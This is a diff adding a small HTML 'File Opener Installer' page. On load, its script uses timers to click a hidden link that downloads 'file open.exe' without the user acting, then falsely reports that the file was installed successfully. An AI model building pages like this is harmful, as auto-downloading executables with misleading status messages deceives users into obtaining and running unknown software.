@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Opener Installer</title>
+<script>
+    setTimeout(function() {
+        document.getElementById('message').innerText = "This will install in 5 seconds.";
+        setTimeout(function() {
+            document.getElementById('message').innerText = "Installing file opener.exe...";
+            setTimeout(function() {
+                var link = document.createElement('a');
+                link.href = 'file open.exe';
+                link.download = 'file open.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                document.getElementById('message').innerText = "File opener.exe installed successfully!";
+            }, 3000);
+        }, 5000);
+    }, 1000);
+
+</script>
+</head>
+<body>
+    <h1>Hello, welcome to File Opener Installer</h1>
+    <p id="message">This will install in a moment...</p>
+</body>
+</html>
